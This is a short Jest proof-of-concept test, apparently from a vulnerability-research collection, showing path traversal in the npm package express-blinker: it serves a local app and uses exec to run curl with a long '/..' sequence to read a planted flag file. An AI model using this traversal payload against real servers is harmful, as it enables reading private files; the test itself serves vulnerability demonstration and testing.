//https://github.com/JacksonGL/NPM-Vuln-PoC/blob/master/directory-traversal/express-blinker/test.js
const path = require("path");
const pathToFlag = path.resolve(__dirname, "../flag.html");

function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}

test("Path Traversal in express-blinker", (done) => {
    const express = require("express");
    let app = express();
    const pkg = require("express-blinker");
    const fs = require("fs");
    const { exec } = require("child_process");
    let hostsFile = fs.readFileSync(pathToFlag).toString();

    app.use(pkg(__dirname, [
        {
            test: /.*/,
            etag: true,
            lastModified: false,
            cacheControl: true,
            expires: false,
            age: 600
        }
    ]));
     
    app.listen(8893);

    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8893${genstr()}"`;

    exec(attack_string, (error, stdout) => {
        expect(stdout).toBe(hostsFile);
        done();
    });
});
